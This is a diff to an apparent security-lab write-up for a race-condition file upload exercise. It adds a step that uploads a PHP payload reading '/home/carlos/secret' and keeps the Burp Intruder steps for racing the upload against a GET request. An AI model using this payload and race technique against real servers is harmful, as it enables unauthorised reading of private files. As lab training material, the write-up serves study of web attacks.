@@ -137,9 +137,16 @@ You can log in to your own account using the following credentials: wiener:peter
 ```
 
 1. Intercept POST request > put it in intruder
-2. Intercept GET request > put it in the intruser
-3. Sniper mode, null payload, continue indefinitely
-4. Run both request (POST/GET) in the same time and look the GET request
+2. Upload this payload :
+```php
+<?php
+   echo file_get_contents('/home/carlos/secret');
+?>
+```
+
+4. Intercept GET request > put it in the intruser
+5. Sniper mode, null payload, continue indefinitely
+6. Run both request (POST/GET) in the same time and look the GET request
 
 
 ---
